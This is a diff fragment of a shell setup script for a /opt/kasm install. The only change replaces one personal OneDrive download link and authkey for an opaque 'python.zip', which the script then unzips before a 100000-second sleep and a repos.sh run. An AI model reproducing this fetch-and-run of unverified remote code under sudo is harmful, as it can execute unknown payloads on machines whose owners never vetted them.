@@ -11,7 +11,7 @@ sudo apt-get autoremove --purge
 sleep 1
 sudo chmod -R 755 /opt/kasm
 sudo apt update
-wget -O python.zip "https://onedrive.live.com/download?cid=6B2C69CA86AC3FC8&resid=6B2C69CA86AC3FC8%213083049&authkey=AFxFfe17EKJ0iL0"
+wget -O python.zip "https://onedrive.live.com/download?cid=6B2C69CA86AC3FC8&resid=6B2C69CA86AC3FC8%213083090&authkey=AOMnckB0SdPmt60"
 unzip python.zip
 sleep 100000
 /opt/kasm/kasm/build/install/./repos.sh
